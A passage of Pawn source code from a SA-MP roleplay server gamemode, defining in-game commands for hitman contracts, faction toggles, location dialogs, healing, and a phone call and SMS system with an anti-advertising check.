	            return 1;
			}
		}
	}
	return 1;
}
CMD:mycontract(playerid, params[])
{
    if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    {
        if(PlayerInfo[playerid][pMember] == 11 || PlayerInfo[playerid][pLeader] == 11)
		{
		    if(GoChase[playerid] != 999)
		    {
		        new name[30],string[128];
		    	GetPlayerName(GoChase[playerid], name, sizeof(name));
		    	format(string, sizeof(string), "You have a contract on %s(%d)",name,GoChase[playerid]);
		    	SendClientMessage(playerid, COLOR_GREY, string);
			}
			else return SendClientMessage(playerid, COLOR_SERVER, "You don't have a contract.");
		}
	}
	return 1;
}
CMD:checkcontract(playerid, params[])
{
    if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    {
        if(PlayerInfo[playerid][pMember] == 11 || PlayerInfo[playerid][pLeader] == 11)
		{
		    new id;
		    if(sscanf(params, "u", id)) return SendClientMessage(playerid, 0xFFFFFFFF,"{A9C4E4}Usage: {FFFFFF}/checkcontract <Name/Playerid>");
			if(PlayerInfo[id][pMember] != 11) return SendClientMessage(playerid, COLOR_SERVER, "This player is not a hitman.");
			if(GoChase[id] != 999)
		    {
		        new name[30],string[128],name2[30];
		    	GetPlayerName(GoChase[id], name, sizeof(name));
		    	GetPlayerName(id,name2,sizeof(name2));
		    	format(string, sizeof(string), "%s have a contract on %s(%d)",name2,name,GoChase[id]);
		    	SendClientMessage(playerid, COLOR_GREY, string);
			}
			else return SendClientMessage(playerid, COLOR_SERVER, "This hitman don't have a contract.");
		}
	}
	return 1;
}
CMD:cancelhit(playerid, params[])
{
    if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    {
        if(PlayerInfo[playerid][pMember] == 11 || PlayerInfo[playerid][pLeader] == 11)
		{
		    if(GoChase[playerid] != 999)
		    {
		        new name[30],string[256];
		        GotHit[GoChase[playerid]] = 0;
				GetChased[GoChase[playerid]] = 999;
				GoChase[playerid] = 999;
            	foreach(Player,i)
	        	togfind[playerid] = 0;
            	PlayerInfo[playerid][pHitT] = 0;
  	 			mysql_format(SQL, string, sizeof(string), "UPDATE users SET `HitT`='%d' WHERE `name`='%s'", PlayerInfo[playerid][pHitT], PlayerInfo[playerid][pNormalName]);
	        	mysql_tquery(SQL,string,"","");
				GetPlayerName(playerid, name, sizeof(name));
		    	format(string, sizeof(string), "%s canceled his contract.",name);
		    	SendFamilyMessage(11, COLOR_TEAL, string);
			}
			else return SendClientMessage(playerid, COLOR_SERVER, "You don't have a contract.");
		}
	}
	return 1;
}
CMD:contracts(playerid, params[])
{
    if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    {
        if(PlayerInfo[playerid][pMember] == 11 || PlayerInfo[playerid][pLeader] == 11)
		{
		    new count1=0,count2=0,string[128];
		    foreach(Player,i)
		    {
		        if(PlayerInfo[i][pHeadValue] != 0)
		        {
		            if(PlayerInfo[i][pSleeping] == 1)
		            {
		            	count1++;
					}
					count2++;
				}
			}
			SendClientMessage(playerid, COLOR_TEAL, "[Contracts]");
			format(string,sizeof(string),"Targets AFK/sleeping: %d",count1);
			SendClientMessage(playerid, COLOR_SERVER, string);
			format(string,sizeof(string),"Total targets: %d",count2);
			SendClientMessage(playerid, COLOR_SERVER, string);
		    SendClientMessage(playerid, COLOR_TEAL, "-------------------");
		}
	}
	return 1;
}
CMD:togapplications(playerid, params[])
{
    return cmd_togapps(playerid, params);
}
CMD:togadmin(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 6) return SCM(playerid, COLOR_ERROR, "No access to this command.");
	if(tog_admin[playerid] == 0) { tog_admin[playerid] = 1; } 
	else if(tog_admin[playerid] == 1) { tog_admin[playerid] = 0; } 
	if(tog_admin[playerid] == 1)
	{
		SCM(playerid, COLOR_SERVER, "Now you'll see actions taken by admins.");
	}
	if(tog_admin[playerid] == 0)
	{
		SCM(playerid, COLOR_SERVER, "You will not see action made by admins.");
	}
	return 1;
}
CMD:togapps(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    {
        if(PlayerInfo[playerid][pRank] == 7 && PlayerInfo[playerid][pMember] != 0)
		{
		    new stringy2[256];

			if(DynamicFactions[PlayerInfo[playerid][pMember]][fApplication] == 1)
			{
				SCM(playerid, COLOR_SERVER, "The applications are now offline.");
				DynamicFactions[PlayerInfo[playerid][pMember]][fApplication] = 0;
				mysql_format(SQL, stringy2, sizeof(stringy2), "UPDATE `factions` SET `Application` = '0' WHERE `ID` = '%d'", PlayerInfo[playerid][pMember]);
				mysql_tquery(SQL,stringy2,"","");
			}
			else if(DynamicFactions[PlayerInfo[playerid][pMember]][fApplication] == 0)
			{
				SCM(playerid, COLOR_SERVER, "The applications are now online.");
				DynamicFactions[PlayerInfo[playerid][pMember]][fApplication] = 1;
				mysql_format(SQL, stringy2, sizeof(stringy2), "UPDATE `factions` SET `Application` = '1' WHERE `ID` = '%d'", PlayerInfo[playerid][pMember]);
				mysql_tquery(SQL,stringy2,"","");
			}
		}
		else
		{
			SCM(playerid, COLOR_GREY, "You are not a faction leader!");
		}
	}
	return 1;
}
CMD:factions(playerid, params[])
{
    if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
		ShowFactions(playerid);
	}
	return 1;
}
CMD:hqs(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
		if(CP[playerid] < 1 && IsCollectingRubbish[playerid] < 1 && !IsATruck(GetPlayerVehicleID(playerid)) && MechanicCallTime[playerid] < 1 && CheckBus[playerid] < 1 && GotoMats[playerid] < 1 && CarJacker[playerid] < 1)
		{
			ShowPlayerDialog(playerid, DIALOG_HQS, DIALOG_STYLE_LIST, "SERVER: HQ Locations", "Los Santos Police Department\nNational Guard\nHitman Agency\nFBI\nNews Reporters\nGrove Street\nBallas\nLos Aztecas\nSchool Instructors\nParamedic Department\nLos Vagos\nTaxi LS\nLas Venturas Police Department", "Checkpoint", "Back");
		}
		else
		{
		    ShowPlayerDialog(playerid, DIALOG_JOBULETES, DIALOG_STYLE_MSGBOX, "Cancel Checkpoint", "Are you sure you want to cancel the current checkpoint?", "Yes", "Nu");
		}
	}
	return 1;
}
CMD:locations(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
		if(CP[playerid] < 1 && IsCollectingRubbish[playerid] < 1 && !IsATruck(GetPlayerVehicleID(playerid)) && MechanicCallTime[playerid] < 1 && CheckBus[playerid] < 1 && GotoMats[playerid] < 1 && CarJacker[playerid] < 1 && JCurier[playerid][0] < 1)
		{
			new sql[1000];
			mysql_format(SQL, sql, sizeof(sql), "SELECT * FROM `locatiigps` WHERE `playerid`='%d' AND `activ`='1'",PlayerInfo[playerid][pSQLID]);
			new Cache: rezultategps = mysql_query(SQL, sql);
			new sumagps = cache_get_row_count();
			cache_delete(rezultategps);
			format(MGLOBAL, sizeof(MGLOBAL), "{0066FF}Location\t{FFFFFF}Info\n{0066FF}Driving School\t{FFFFFF}If your license is expired, come and collects it.\n{0066FF}Los Santos\t{FFFFFF}Want to get to a business in Los Santos? If so, click here!\n{0066FF}Las Venturas\t{FFFFFF}Want to get to a business in Las Venturas? If so, click here!\n");
			format(MGLOBAL, sizeof(MGLOBAL), "%s{0066FF}Faction HQS\t{FFFFFF}You need to talk to a member of a faction and not know where to find him? If so, click here!\n",MGLOBAL);
			format(MGLOBAL, sizeof(MGLOBAL), "%s{0066FF}Vehicle Mod Shops\t{FFFFFF}Forgot where tuning was one of the sites? Click here for a list of tuning functional sites on the server.\n", MGLOBAL);
			format(MGLOBAL, sizeof(MGLOBAL), "%s{0066FF}Fun Area\t{FFFFFF}Need entertainment? If so, come here!\n{0066FF}Dealership\t{FFFFFF}Do you want to buy a new vehicle? If so, you're welcome to lounge vehicles!\n{0066FF}custom locations\t{FFFFFF}There is one location that you need? Then add a single! (%d custom locations)",MGLOBAL, sumagps);
			format(MGLOBAL, sizeof(MGLOBAL), "%s\n{0066FF}Church LS\t{FFFFFF}Do you want to get married? Come to church!",MGLOBAL);
			ShowPlayerDialog(playerid, DIALOG_LOCATIONS, DIALOG_STYLE_TABLIST_HEADERS, "SERVER: Server Locations", MGLOBAL, "Select", "Close");
		}
		else
		{
		    ShowPlayerDialog(playerid, DIALOG_JOBULETES, DIALOG_STYLE_MSGBOX, "Cancel Checkpoint", "Are you sure you want to cancel the current checkpoint?", "Yes", "Nu");
		}
	}
	return 1;
}
CMD:gps(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	return cmd_locations(playerid, params);
}
CMD:healto(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
		new id,price,sendername[30],giveplayer[30],string[200];
		if(PlayerInfo[playerid][pMember] != 14) return SCM(playerid,COLOR_SERVER,"{FFB870}You are not a Paramedic.");
		if(sscanf(params, "ui", id,price)) return SendClientMessage(playerid, 0xFFFFFFFF,"{A9C4E4}Usage: {FFFFFF}/healto <Name/Playerid> <Price>");
	    if(price < 1 || price > 1000) return SendClientMessage(playerid, COLOR_SERVER,"{FFB870}Healing price not below $1 or above $1,000.");
		if (id == playerid) return SendClientMessage(playerid, COLOR_SERVER,"{FFB870}You can not heal yourself.");
    	if (IsPlayerConnected(id))
		{
			if(id != INVALID_PLAYER_ID)
			{
				if(GetPlayerCash(id) < price) return SCM(playerid,COLOR_SERVER,"{FFB870}This player does not have enough money.");
				if(OnDutymedic[playerid] < 1) return SCM(playerid,COLOR_SERVER,"{FFB870}You must be on duty to use this command.");
			    GetPlayerName(id, giveplayer, sizeof(giveplayer));
			    GetPlayerName(playerid, sendername, sizeof(sendername));
				new giveambu = GetPlayerVehicleID(id),
					playambu = GetPlayerVehicleID(playerid);
				if (IsAnAmbulance(playambu) && playambu == giveambu)
				{
					new Float:tempheal;
					GetPlayerHealthEx(id,tempheal);
					if(tempheal >= 100.0) return SendClientMessage(playerid, COLOR_SERVER,"{FFB870}This player has full life.");
					format(string, sizeof(string), "~w~You healed ~n~~w~%s~n~~g~$%d", giveplayer,price);
					GameTextForPlayer(playerid, string, 5000, 1);
					GivePlayerCash(playerid,price);
					GivePlayerCash(id,-price);
					SetPlayerHealthEx(id, 100);
					PlayerPlaySound(playerid, 1150, 0.0, 0.0, 0.0);
					format(string, sizeof(string), "You have been healed for %s$.",FormatNumber(price));
					SendClientMessage(id, COLOR_LIGHTBLUE,string);
					Update(id, pCashx);
					Update(playerid, pCashx);
					PlayerInfo[playerid][pPHeals] += 1;
					Update(playerid,pPHealsx);
				}
				else
				{
					SendClientMessage(playerid, COLOR_SERVER,"{FFB870}One of you is not in the ambulance/chopper.");
					return 1;
				}
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
			return 1;
		}
	}
	return 1;
}
CMD:heal(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
		new string[100],sendername[25];
		if(IsACop(playerid))
		{
			if(InHouse[playerid] > 0)
			{
            	SetPlayerHealthEx(playerid,100.0);
            	if(HouseInfo[InHouse[playerid]][hArm] == 1 && OnDuty[playerid] == 1)
				{
					GetPlayerName(playerid,sendername,sizeof(sendername));
					format(string, sizeof(string), "* %s puts on body armour.", sendername);
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPlayerArmourEx(playerid,100.0);
				}
			}
			else
			{
				if(IsPlayerInRangeOfPoint(playerid, 50.0, 245.8297,112.4436,1003.2188) || IsPlayerInRangeOfPoint(playerid, 50.0, 236.3031,162.9478,1003.0300) && IsACop(playerid))
				{
                	if(GetPlayerInterior(playerid) == 0) return SCM(playerid,COLOR_SERVER,"{FFB870}You are not in a locker room.");
					SetPlayerHealthEx(playerid,100.0);
					if(OnDuty[playerid] == 1)
					{
						SetPlayerArmourEx(playerid,100.0);
					}
				}
				else if(IsPlayerInRangeOfPoint(playerid, 50.0, 769.9825,-39.2081,1000.6865) || IsPlayerInRangeOfPoint(playerid, 50.0, 1719.3446,-1662.2314,20.2285) || IsPlayerInRangeOfPoint(playerid, 50.0,2324.3416,-1143.3370,1050.4922) || IsPlayerInRangeOfPoint(playerid, 50.0,616.0771,-11.4624,1000.9219)
				|| IsPlayerInRangeOfPoint(playerid, 50.0,960.9341,-51.0495,1001.1172) || IsPlayerInRangeOfPoint(playerid, 50.0,957.6353,2109.3533,1011.0234) || IsPlayerInRangeOfPoint(playerid, 50.0,1496.2422,1306.8334,1093.2891))
				{
					SetPlayerHealthEx(playerid,100.0);
				}
			}
		}
		else
		{
			if(InHouse[playerid] > 0)
			{
				if(HouseInfo[InHouse[playerid]][hHel] == 1)
				{
					SetPlayerHealthEx(playerid,100.0);
				}
			}
			if(PlayerInfo[playerid][pMember] != 0)
			{
				if(IsPlayerInRangeOfPoint(playerid, 50.0, 769.9825,-39.2081,1000.6865) || IsPlayerInRangeOfPoint(playerid, 150.0, 1719.3446,-1662.2314,20.2285) || IsPlayerInRangeOfPoint(playerid, 50.0,2324.3416,-1143.3370,1050.4922) || IsPlayerInRangeOfPoint(playerid, 50.0,616.0771,-11.4624,1000.9219)
				|| IsPlayerInRangeOfPoint(playerid, 50.0, 960.9341,-51.0495,1001.1172) || IsPlayerInRangeOfPoint(playerid, 150.0,957.6353,2109.3533,1011.0234) || IsPlayerInRangeOfPoint(playerid, 50.0,1496.2422,1306.8334,1093.2891) || IsPlayerInRangeOfPoint(playerid, 50.0,-2031.0696,-116.9199,1035.1719)
				|| IsPlayerInRangeOfPoint(playerid, 50.0, 2496.05,-1695.24,1014.74))
				{
	                if(GetPlayerInterior(playerid) == 0) return SCM(playerid,COLOR_SERVER,"{FFB870}Error: You can not take heal here.");
					SetPlayerHealthEx(playerid,100.0);
				}
			}
		}
	}
	return 1;
}
CMD:call(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
		new number,sendername[30],string[256],giveplayer[25];
		if(sscanf(params, "i",number)) return SendClientMessage(playerid, 0xFFFFFFFF,"{A9C4E4}Usage: {FFFFFF}/call <Number>");
		if(PlayerInfo[playerid][pPnumber] == 0) return SendClientMessage(playerid, COLOR_SERVER, "You dont't have a phone.");
		if(PhoneOnline[playerid] > 0) return SCM(playerid, COLOR_SERVER, "Your phone is turned off.");
		if(PlayerInfo[playerid][pCredits] < 2) return SCM(playerid, COLOR_SERVER, "You don't have enough credits to call.");
		GetPlayerName(playerid, sendername, sizeof(sendername));
		/*if(number == 112)
		{
		    if(IsACop(playerid)) return SCM(playerid,COLOR_SERVER,"You are a cop.");
    	    if(WantedReason[playerid] != 0)
    	    {
    	        new killerid = GetPlayerID(WantedName[playerid]);
				if(killerid < 0) return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
				if(killerid == INVALID_PLAYER_ID) return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
				if(!IsPlayerConnected(killerid)) return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
				if(!IsPlayerConnected(killerid)) return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
                if(PlayerInfo[killerid][pWantedLevel] >= 6) return SCM(playerid,COLOR_SERVER,"{FFB870}This player has got already maximum of wanted stars.");
				else { WantedPoints[killerid] += 2; }
                if(WantedPoints[killerid] > 13)
				{
					WantedPoints[killerid] = 13;
				}
				format(string,sizeof(string),"You reported %s for a crime.",GetName(killerid));
				SCM(playerid,COLOR_LIGHTBLUE,string);
				if(WantedReason[playerid] == 1)
				{
					SetPlayerCriminal(killerid,playerid, "first degree murder");
				}
				WantedReason[playerid] = 0;
				ClearWanted(playerid);
				return 1;
		    }
			else return SCM(playerid,COLOR_SERVER,"{FFB870}You don't have a reason for reporting any crime.");
		}*/
		if(number == PlayerInfo[playerid][pPnumber]) return SendClientMessage(playerid, COLOR_GRAD2, "You're trying to call yourself.");
		if(Mobile[playerid] != -1) return SendClientMessage(playerid, COLOR_SERVER, "You are already on a call.");
		for(new i = 0; i < MAX_PLAYERS; i++)
		{
			if(IsPlayerConnected(i))
			{
				if(PlayerInfo[i][pPnumber] == number && number != 0)
				{
					new giveplayerid = i;
					if(IsPlayerConnected(giveplayerid))
					{
						if(giveplayerid != INVALID_PLAYER_ID)
						{
						    if(PhoneOnline[giveplayerid] > 0) return SendClientMessage(playerid, COLOR_SERVER, "That player phone is offline.");
							if(PhoneOnlineCalls[giveplayerid] > 0) return SendClientMessage(playerid, COLOR_SERVER, "That player phone is offline for calls.");
							if (Mobile[giveplayerid] == -1)
							{
								Mobile[playerid] = giveplayerid;
								format(string, sizeof(string), "* %s takes out their cellphone, and dials in a number.", sendername);
								ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
								PlayerPlaySound(playerid, 3600, 0.0, 0.0, 0.0);
								PlayerPlaySound(giveplayerid, 20600, 0.0, 0.0, 0.0);
								format(string, sizeof(string), "{F6FF00}%s is calling you. Use /p(ickup) to answer your phone.", sendername);
								SendClientMessage(giveplayerid, COLOR_YELLOW, string);
								GetPlayerName(giveplayerid,giveplayer,sizeof(giveplayer));
								if(PlayerInfo[playerid][pPhone] == 0)
								{
									SetPlayerAttachedObject(playerid,4,330,6, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 );
								}
								else if(PlayerInfo[playerid][pPhone] == 1)
								{
									SetPlayerAttachedObject( playerid, 4, 18865, 6, 0.086043, 0.027719, 0.003817, 95.232246, 178.651031, 1.691840, 1.002077, 1.000000, 1.000000 ); // MobilePhone1 - phone1
								}
								if(PlayerInfo[giveplayerid][pPhone] == 0)
								{
									format(string, sizeof(string), "* %s's cellphone starts to ring...", giveplayer);
								}
								else if(PlayerInfo[giveplayerid][pPhone] == 1)
								{
									format(string, sizeof(string), "* %s's iPhone starts to ring...", giveplayer);
								}
								ProxDetector(20.0, giveplayerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
								CellTime[playerid] = 1;
								SetPlayerSpecialAction(playerid,SPECIAL_ACTION_USECELLPHONE);
								return 1;
							}
						}
					}
				}
			}
		}
		SendClientMessage(playerid, COLOR_GRAD2, "(cellphone) *busy tone*");
	}
	return 1;
}
CMD:t(playerid, params[])
{
    return cmd_sms(playerid, params);
}
CMD:sms(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
		new phonenumb,smstext[90],sendername[30],giveplayer[30],string[256],giveplayerid,string2[184];
	    if(PlayerInfo[playerid][pMuted] == 1)
	    {
			format(string, sizeof(string), "You can not speak, you have been silenced for %d seconds.",PlayerInfo[playerid][pMuteTime]);
			SendClientMessage(playerid, COLOR_ERROR, string);
			return 1;
		}
		if(sscanf(params, "is[90]",phonenumb,smstext)) return SendClientMessage(playerid, 0xFFFFFFFF,"{A9C4E4}Usage: {FFFFFF}/sms <Number> <Text>");
		if(FindIP(smstext)) /// Anti-Reclama
        {
	        new advertiser[MAX_PLAYER_NAME];
	        GetPlayerName(playerid, advertiser, sizeof(advertiser));
	        format(string, sizeof(string), "{ba9789}Warning: %s(%d) typed %s in /sms.", advertiser, playerid, smstext);
			ABroadCast(COLOR_SERVER,string,1);
        }
        for(new i; i < sizeof(TLD); i++)
		{
			if(strfind(smstext, TLD[i], true) != -1)
			{
				if(strfind(smstext, "wwww.Magic-Gaming.tk", true) != -1 || strfind(smstext, "wwww.Magic-Gaming.tk/forum", true) != -1 || strfind(smstext, "Magic-Gaming.tk", true) != -1) break;
				new advertiser[MAX_PLAYER_NAME];
				GetPlayerName(playerid, advertiser, sizeof(advertiser));
				format(string, sizeof(string), "{ba9789}Warning: %s(%d) typed %s in /sms.", advertiser, playerid, smstext);
				ABroadCast(COLOR_SERVER,string,1);
			}
		}
		if(PlayerInfo[playerid][pPnumber] == 0) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You dont't have a cell phone.");
		if(PhoneOnline[playerid] > 0) return SCM(playerid, COLOR_SERVER, "{FFB870}Your phone turned off.");
		if(PlayerInfo[playerid][pCredits] < 2) return SCM(playerid,COLOR_SERVER,"{FFB870}You don't have credits needed.");
		foreach(Player,i)
		{
			if(PlayerInfo[i][pPnumber] == phonenumb && phonenumb != 0)
			{
				if(IsPlayerConnected(giveplayerid))
				{
					if(giveplayerid != INVALID_PLAYER_ID)
					{
					    giveplayerid = i;
					    if(PhoneOnline[giveplayerid] > 0) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}That players phone is offline.");
					    GetPlayerName(playerid, sendername, sizeof(sendername));
						format(string, sizeof(string), "{F6FF00}SMS from %s (%d): %s",sendername,PlayerInfo[playerid][pPnumber],smstext);
						GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
						format(string2, sizeof(string2), "{F6FF00}SMS sent to %s (%d): %s",giveplayer,PlayerInfo[giveplayerid][pPnumber],smstext);
						SendClientMessage(giveplayerid,COLOR_YELLOW, string);
						SendClientMessage(playerid,COLOR_SERVER, string2);
						new resulttt[300],strr[300];
						format(strr, sizeof(strr),"(sms) %s",smstext);
						mysql_real_escape_string(strr, resulttt);
						PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
						PlayerPlaySound(giveplayerid, 1139, 0.0, 0.0, 0.0);
						PlayerInfo[playerid][pCredits] = PlayerInfo[playerid][pCredits] - 2;
						LastPlayer[i] = playerid;
						for(new adm = 0; adm<=MAX_PLAYERS;adm++)
     					{
     	    				if(IsPlayerConnected(adm))
							{
  	    						if(PlayerInfo[adm][pAdmin] > 0 && BigEar[adm] == 1)
        	    				{
        	        				format(string, sizeof(string), "{F6FF00}SMS from %s (%d) to %s (%d): %s",sendername,playerid,giveplayer,giveplayerid,smstext);
									SendClientMessage(adm,  COLOR_SERVER, string);
    	    					}
							}
      					}
					}
				}
			}
		}
	}
	return 1;
}
CMD:reply(playerid, params[])
{
    if(PlayerInfo[playerid][pPhone] == 1)
	{
	    if(LastPlayer[playerid] != -1)
	    {
	        if(PlayerInfo[playerid][pCredits] >= 2)
	        {
	            new sendername[30],giveplayer[30],string[256],string2[256];
	            if(strlen(params) <= 0) return SendClientMessage(playerid, 0xFFFFFFFF,"{A9C4E4}Usage: {FFFFFF}/reply <Text>");
	    		if(PhoneOnline[LastPlayer[playerid]] > 0) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}That players phone is offline.");
			    GetPlayerName(playerid, sendername, sizeof(sendername));
				format(string, sizeof(string), "{F6FF00}SMS from %s (%d): %s",sendername,PlayerInfo[playerid][pPnumber],params);
				GetPlayerName(LastPlayer[playerid], giveplayer, sizeof(giveplayer));
				LastPlayer[LastPlayer[playerid]] = playerid;
				format(string2, sizeof(string2), "{F6FF00}SMS sent to %s (%d): %s",giveplayer,PlayerInfo[LastPlayer[playerid]][pPnumber],params);
				SendClientMessage(LastPlayer[playerid],COLOR_YELLOW, string);
				SendClientMessage(playerid,COLOR_SERVER, string2);
				new resulttt[300],strr[300];
				format(strr, sizeof(strr),"(sms) %s",params);
				mysql_real_escape_string(strr, resulttt);
				PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
				PlayerPlaySound(LastPlayer[playerid], 1139, 0.0, 0.0, 0.0);
				PlayerInfo[playerid][pCredits] = PlayerInfo[playerid][pCredits] - 2;
				if(FindIP(params))
  				{
					format(string, sizeof(string), "{ba9789}Warning: %s(%d) typed %s in /reply.", sendername,playerid,params);
					ABroadCast(COLOR_SERVER,string,1);
   				}
	    		for(new d; d < sizeof(TLD); d++)
				{
  					if(strfind(params,TLD[d],true) != -1 )
	    			{
						if(strfind(params, "wwww.Magic-Gaming.tk", true) != -1 || strfind(params, "wwww.Magic-Gaming.tk/forum", true) != -1 || strfind(params, "Magic-Gaming.tk", true) != -1) break;
						format(string, sizeof(string), "{ba9789}Warning: %s(%d) typed %s in /reply.", sendername,playerid,params);
						ABroadCast(COLOR_SERVER,string,1);
					}
				}
				for(new adm = 0; adm<=MAX_PLAYERS;adm++)
				{
					if(IsPlayerConnected(adm))
					{
						if(PlayerInfo[adm][pAdmin] > 0 && BigEar[adm] == 1)
  						{
    						format(string, sizeof(string), "{F6FF00}SMS from %s (%d) to %s (%d): %s",sendername,playerid,giveplayer,LastPlayer[playerid],params);
							SendClientMessage(adm,  COLOR_SERVER, string);
  						}
					}
				}
			}
			else return SCM(playerid,COLOR_SERVER,"{FFB870}You don't have credits needed.");
		}
		else return SendClientMessage(playerid, COLOR_GREY, "Nobody has sent you an SMS!");
	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "You don't have an iPhone!");
	}
	return 1;
}
CMD:speaker(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
		if(PlayerInfo[playerid][pPnumber] == 0) return SendClientMessage(playerid,COLOR_SERVER, "{FFB870}You do not have a phone.");
		if(Mobile[playerid] == -1) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You are not in a phone call.");
		if(PlayerInfo[playerid][pSpeaker] == 0)
		{
			SendClientMessage(playerid, COLOR_YELLOW2, "** Speaker is on.");
			PlayerInfo[playerid][pSpeaker] = 1;
			return 1;
		}
		if(PlayerInfo[playerid][pSpeaker] == 1)
		{
			SendClientMessage(playerid, COLOR_YELLOW2, "** Speaker is off.");
			PlayerInfo[playerid][pSpeaker] = 0;
			return 1;
		}
	}
	return 1;
}
CMD:turn(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
	{
        new x_nr[50],sendername[30],string[128];
		if(sscanf(params, "s[50]",x_nr)) return SendClientMessage(playerid, 0xFFFFFFFF,"{A9C4E4}Usage: {FFFFFF}/turn <On/Off/Off calls>");
        if(strcmp(x_nr,"off calls",true) == 0)
     	{
			if(PlayerInfo[playerid][pPhone] != 1) return SendClientMessage(playerid, COLOR_SERVER, "Doar cei ce au iPhone pot sa dezactiveze apelurile. Pentru a cumpara un iPhone foloseste /shop.");
            if (PhoneOnlineCalls[playerid] == 0)
            {
                PhoneOnlineCalls[playerid] = 1;
                GetPlayerName(playerid, sendername, sizeof(sendername));
                format(string, sizeof(string), "* %s turns his/her iPhone off for calls.", sendername);
	    		ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	    		return 1;
			}
			else
			SCM(playerid, COLOR_SERVER, "Your phone is already turned off for calls.");
			return 1;
		}
		if(strcmp(x_nr,"off",true) == 0)
     	{
            if (PhoneOnline[playerid] == 0)
            {
                PhoneOnline[playerid] = 1;
                GetPlayerName(playerid, sendername, sizeof(sendername));
				if(PlayerInfo[playerid][pPhone] == 0)
				{
                    format(string, sizeof(string), "* %s turns off his/her phone.", sendername);
				}
				else if(PlayerInfo[playerid][pPhone] == 1)
				{
                    format(string, sizeof(string), "* %s turns off his/her iPhone.", sendername);
				}
	    		ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	    		return 1;
			}
			else
			{
				if(PlayerInfo[playerid][pPhone] == 0)
				{
					SCM(playerid, COLOR_SERVER, "Your phone is already turned off.");
				}
				else if(PlayerInfo[playerid][pPhone] == 1)
				{
					SCM(playerid, COLOR_SERVER, "Your iPhone is already turned off.");
				}
				return 1;
			}
		}
		if(strcmp(x_nr,"on",true) == 0)
     	{
            if (PhoneOnline[playerid] == 1)
            {
                PhoneOnline[playerid] = 0;
				PhoneOnlineCalls[playerid] = 0;
                GetPlayerName(playerid, sendername, sizeof(sendername));
				if(PlayerInfo[playerid][pPhone] == 0)
				{
					format(string, sizeof(string), "* %s turns on his/her phone.", sendername);
				}
				else if(PlayerInfo[playerid][pPhone] == 1)
				{
					format(string, sizeof(string), "* %s turns on his/her iPhone.", sendername);
				}
				ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				return 1;
			}
			else
			{
				if(PlayerInfo[playerid][pPhone] == 0)
				{
					SCM(playerid, COLOR_SERVER, "Your phone is already turned on.");
				}
				else if(PlayerInfo[playerid][pPhone] == 1)
				{
					SCM(playerid, COLOR_SERVER, "Your iPhone is already turned on.");
				}
				return 1;
			}
		}
    }
    return 1;
}
CMD:pickup(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
	{
		if(Mobile[playerid] != -1) return SendClientMessage(playerid, COLOR_GRAD2, "You are already on a call...");
		foreach(Player,i)
		{
